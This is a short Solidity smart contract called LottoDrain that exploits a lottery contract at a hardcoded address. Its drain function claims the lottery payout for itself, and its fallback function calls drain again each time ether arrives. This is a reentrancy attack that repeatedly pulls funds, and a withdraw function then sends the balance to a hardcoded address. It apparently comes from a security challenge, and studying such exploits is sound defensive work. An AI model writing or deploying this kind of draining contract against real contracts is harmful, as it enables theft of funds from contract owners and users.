// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";


interface ILottery {
    function payoutWinningTeam(address _team) external returns (bool);
}

contract LottoDrain is Ownable 
{
    address private constant LotteryContractAddr = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
    //address private constant OracleContractAddr = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;
    address private constant WinnersAddr = 0x9f61132889cB8738A386E2cdbA10eFA19D2880BD;

    function drain() public {
        ILottery(LotteryContractAddr).payoutWinningTeam(address(this));
    }

    fallback() external payable {
        drain();
    }

    function withdraw() public {
        (bool sent,) = address(WinnersAddr).call{value: address(this).balance}("");
        require(sent);
    }
}